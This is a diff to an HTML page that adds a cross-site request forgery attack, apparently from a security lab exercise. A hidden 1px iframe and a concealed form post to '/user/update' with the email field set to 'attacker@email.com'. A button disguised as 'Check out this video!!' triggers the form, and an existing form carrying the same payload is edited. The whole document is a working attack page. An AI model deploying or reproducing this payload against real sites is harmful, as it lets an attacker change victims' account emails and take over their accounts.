@@ -1,7 +1,19 @@
+<style>
+    .hide { position:absolute; top:-1px; left:-1px; width:1px; height:1px; }
+</style>
+  
+<iframe name="hiddenFrame" class="hide"></iframe>
+  
+<form action="/user/update" method="post" target="hiddenFrame">
+    <input type="text" name="email" id="update-email" value="attacker@email.com" style="display: none;"><br>
+    <button type="submit" id="signup-button">Check out this video!!</button>
+</form>
+  
+
 <a href="http://yt.com" target="_blank" id="link"> Check out this video!! </a>
 <form action="/user/update" method="post">
-    <input type="text" name="name" id="update-name" value="user001" style="display: none;"><br>
-    <input type="text" name="user" id="update-uname" value="user001" style="display: none;"><br>
+    <!-- <input type="text" name="name" id="update-name" value="user001" style="display: none;"><br>
+    <input type="text" name="user" id="update-uname" value="user001" style="display: none;"><br> -->
     <input type="text" name="email" id="update-email" value="attacker@email.com" style="display: none;"><br>
     <button type="submit" id="signup-button">Check out this video!!</button>
 </form>
